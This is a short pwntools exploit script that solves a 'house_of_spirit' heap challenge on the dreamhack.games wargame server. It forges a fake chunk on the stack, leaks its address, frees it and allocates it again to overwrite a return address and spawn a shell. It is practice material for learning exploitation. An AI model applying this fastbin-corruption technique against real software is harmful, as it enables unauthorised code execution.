from pwn import *
context.update(log_level = 'debug')
p = None
def Create(size, data):
	global p
	p.sendlineafter('>', '1')
	p.sendlineafter('Size: ', str(size))
	p.sendlineafter('Data: ', data)
def Delete(addr):
	global p
	p.sendlineafter('>', '2')
	p.sendlineafter('Addr: ', str(addr))
#p = process('house_of_spirit')
p = remote('host1.dreamhack.games', 22662)
size = 0x30
p.sendline(p64(0) + p64(size + 0x10 + 1))
p.recvuntil('name: ')
addr_stack = int(p.recvline().split(':')[0],16)
log.info('stack: ' + hex(addr_stack))
addr_shell = 0x400940
#raw_input('debug: ' +str(p.pid))
Delete(addr_stack+16)
Create(size, 'a'*(size-8) + p64(addr_shell))
p.interactive()
